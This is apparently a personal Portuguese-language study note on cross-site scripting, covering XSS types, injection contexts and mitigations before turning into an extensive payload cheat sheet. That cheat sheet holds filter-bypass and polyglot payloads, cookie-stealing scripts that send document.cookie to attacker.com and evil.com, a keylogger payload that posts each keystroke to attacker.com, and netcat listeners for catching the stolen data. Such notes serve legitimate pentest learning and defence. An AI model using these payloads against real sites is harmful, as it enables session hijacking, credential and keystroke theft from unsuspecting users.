2025-08-25 12:04

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[XSS]] | [[Pentest]]

----
# Introdução

***Cross-Site Scripting* (XSS)** é uma vulnerabilidade de segurança que permite a invasores injetar scripts maliciosos em páginas web visualizadas por outros usuários. É umas vulnerabilidades web mais comuns e perigosas.

![[Pasted image 20250825121027.png]]

## Impactos do XSS

- Roubo de cookies  e sessões.
- Keylogging (captura de teclas digitadas).
- Defacement (modificação de páginas).
- Redirecionamento para sites maliciosos.
- Execução de ações em nome do usuário.

---
# Tipos de XSS

## 1. *Reflected XSS* (Não-Persistente)

- O script malicioso é refletido imediatamente na resposta.
- Reque que a vítima clique em um link manipulado.
- **Exemplo:** `http://site.com/search?=q<script>alert(1)</script>`

![[Pasted image 20250825121121.png]]

## 2. *Stored XSS* (Persistente)

- O script é armazenado no servidor (ex.: banco de dados).
- Afeta todos os usuários que visualizam o conteúdo.
- **Exemplo:** Comentários, perfis, fóruns.

![[Pasted image 20250825121048.png]]

## 3. *DOM-based XSS*

- Ocorre inteiramente no lado do cliente (não envolve servidor).
- Manipulação do DOM através de sinks vulneráveis.
- **Exemplo:** `document.write(location.hash)`.

![[Pasted image 20250825121144.png]]

---
# Como Funciona o XSS?

1. **Injeção:** Atacante encontra entrada não sanitizada.
2. **Execução:** Script é executado no navegador da vítima.
3. **Exploração:** Dados sensíveis são roubados ou ações maliciosas executadas.

---
# Contexto de Injeção

Diferentes contextos requerem diferentes payloads:

## Contexto HTML

```html
<div>INJEÇÃO AQUI</div>
<script>INJEÇÃO_AQUI</script>
```

## Contexto JavaScript

```js
var data = "INJEÇÃO_AQUI";
var data = 'INJEÇÃO_AQUI';
```

## Contexto Atributo

```html
<input value="INJEÇÃO_AQUI">
<div class="INJEÇÃO_AQUI">
```

---
# Prevenção e Mitigação

- ***Input Validation:*** Validar todas as entradas.
- ***Output Encoding:*** Escapar caracteres especiais.
- ***Content Security Policy* (CSP):** Restringir fontes de script.
- ***HttpOnly Cookies:*** Impedir acesso via JavaScript.
- ***X-XSS-Protection:*** Headers de proteção do navegador.

---
# Cheat Sheet de XSS - Payloads e Comandos

## Payloads Básicos

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

- `<script>alert('XSS')</script>`
	- **Mecanismo**: Tag `<script>` é interpretada pelo navegador.
	- **Uso**: Contexto HTML onde tags são renderizadas.
	- **Limitações**: Facilmente bloqueado por WAFs.

- `<img srx=x onerror=alert('XSS')>`
	- **Mecanismo:** Atributo `onerror` executa JS quando a imagem falha ao carregar.
	- **Vantagem:** Não usa tag `<script>`, bypass alguns filtros.
	- **Variantes:** `onload`, `onmouseove`, `onfocus`.

- `<svg onload=alert('XSS')>`
	- **Mecanismo:** SVG é um elemento HTML5, `onload` executa quando carregado.
	- **Vantagem:** Menos comum que `img`, pode bypass filtros.

## Payloads Avançados

### Bypass de Filtros Básicos

```html
<scr<script>ipt>alert(1)</script>
<img src=x onerror="alert`1`">
<svg onload=alert(1)>
```

- `<scr<script>ipt>alert(1)</script>`
	- **Mecanismo:** Filtro remove `<script>`, mas a remoção cria novo `<script>`.
	- **Funcionamento:** `remove("<script>")` em `<scr<script>ipt>`  → `<script>`

### Bypass de Word Filters

```html
<IMG SRC=x onerror="alert('XSS')">
<scri%00pt>alert(1)</script>
```

- `<IMG SRC=x onerror="alert('XSS')">`
	- **Mecanismo:** Tags HTML não são case-sensitive, bypass filtros case-sensitive.

- `<scri%00pt>alert(1)</script>`
	- **Mecanismo:** Null byte (`%00`) pode confundir parsers.

### Polyglot XSS (Funciona em múltiplos contextos)

```js
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

- **Mecanismo**: Funciona em múltiplos contextos (HTML, JS, atributo)
- **Design**: Contorna fechamento de tags e quebras de contexto

## Payloads para Roubo de Cookies

```js
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
<img src=x onerror="this.src='http://evil.com/?c='+document.cookie">
```

- `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
	- **Mecanismo:** `fetch()` envia cookies para servidor atacante.
	- **Requisitos:** Cookies não HttpOnly.

- `<img src=x onerror="this.src='http://evil.com/?c='+document.cookie">`
	- **Mecanismo:** Imagem falha, `onerror` dispara, envia cookies via URL.

## Payloads para Keylogging

```js
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
}
</script>
```

- **Mecanismo**: Event listener captura teclas e envia para atacante
- **Variações**: `onkeydown`, `onkeyup`

## Payloads para DOM XSS

```js
# URL: http://site.com/#<script>alert(1)</script>
<script>eval(location.hash.slice(1))</script>
```

- **Mecanismo**: `location.hash` contém conteúdo após `#`, `eval()` executa
- **Exploração**: `http://site.com/#alert(1)`

## Payloads para Bypass CSP

```html
<script src="data:text/javascript,alert(1)"></script>
```

- **Mecanismo**: `data:` scheme é permitido em algumas políticas CSP

---
# Ferramentas de Teste XSS

## Scanner Automatizado

```bash
# XSStrike
python3 xsstrike.py -u "http://site.com/search?q=test"

# Nuclei
nuclei -u http://site.com -t xss.yaml
```

- **Funcionamento**:
    1. Reconhecimento de parâmetros
    2. Análise de filtros
    3. Geração de payloads específicos
    4. Verificação de vulnerabilidades

## Teste Manual com Burp Suite

1. Envie requisição para Burp Repeater
2. Teste payloads manualmente
3. Use Burp Scanner para detecção automática

## Teste de Encoding

```js
// URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Unicode Encoding
\u003Cscript\u003Ealert(1)\u003C/script\u003E
```

---
# Comandos Úteis para Testes

## Criar Servidor para Receber Dados

```bash
# Python3
python3 -m http.server 8000

# Netcat (listen for connections)
nc -lvnp 80
```

- `python3 -m http.server 8000`
	- **Funcionamento**: Servidor HTTP simples na porta 8000
	- **Uso**: Receber callbacks de payloads bem-sucedidos

- `nc -lvnp 80`
	- **Funcionamento**: Netcat escuta na porta 80 por conexões
	- **Uso**: Receber dados exfiltrados (cookies, keystrokes)

## Testar Reflected XSS

```bash
curl -s "http://site.com/search?q=<script>alert(1)</script>" | grep -i "script"
```

- **Mecanismo**: Envia payload e verifica se é refletido não-sanitizado
- **Interpretação**: Se o payload aparecer na resposta, pode ser vulnerável

## Gerar Payloads Encodados

```bash
# URL encode
echo '<script>alert(1)</script>' | python3 -c "import urllib.parse; print(urllib.parse.quote(input()))"

# Base64 encode
echo 'alert(1)' | base64
```

- `echo '<script>alert(1)</script>' | python3 -c "import urllib.parse; print(urllib.parse.quote(input()))"`
	- **Resultado**: `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
	- **Uso**: Bypass filtros que não decode URL

- `echo 'alert(1)' | base64`
	- **Resultado**: `YWxlcnQoMSkK`
	- **Uso**: Em payloads como `data:text/html;base64,YWxlcnQoMSkK`


---
# Payloads para Diferentes Contextos

## Contexto JavaScript

```js
';alert(1);//
";alert(1);//
```

```html
</script><script>alert(1)</script>
```

- `';alert(1);//`
	- **Mecanismo**: Quebra string existente, adiciona comando, comenta resto.

- `</script><script>alert(1)</script>`
	- **Mecanismo:** Fecha tag script atual, abre nova maliciosa.

## Contexto Atributo HTML

```html
" onmouseover="alert(1)"
' onfocus="alert(1)" autofocus
q=%22%20onmouseover%3D%22alert%281%29%22%20x%3D%22
```

- `" onmouseover="alert(1)"
	- **Mecanismo:** Fecha atributo existente, adiciona manipulador de evento.

- `' onfocus="alert(1)" autofocus`
	- **Mecanismo:** `autofocus` faz elemento ganhar foco automaticamente
## Contexto HTML

```js
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---
# Verificação de Proteções

```js
// Verificar se cookies são HttpOnly
console.log(document.cookie)

// Verificar CSP
console.log(document.contentSecurityPolicy)
```

- `console.log(document.cookie)`
	- **Interpretação:** Se retornar vazio mas cookies existe, são HttpOnly.

- `console.log(document.contentSecurityPolicy)`
	- **Interpretação:**  Mostra políticas CSP ativas.

---
# Recursos Adicionais

- **PayloadsAllTheThings**: GitHub com coleção de payloads
- **XSS Polyglot**: Payloads que funcionam em múltiplos contextos
- **OWASP XSS Prevention Cheat Sheet**: Guia de prevenção

>[!warning] Disclaimer!
> Use este conhecimento apenas em sistemas onde você tem permissão para testar.
> 
> Testes não autorizados são ilegais e antiéticos.

---
# PARA PAYLOADS PRONTOS

[XSS PAYLOAD LIST](https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt)
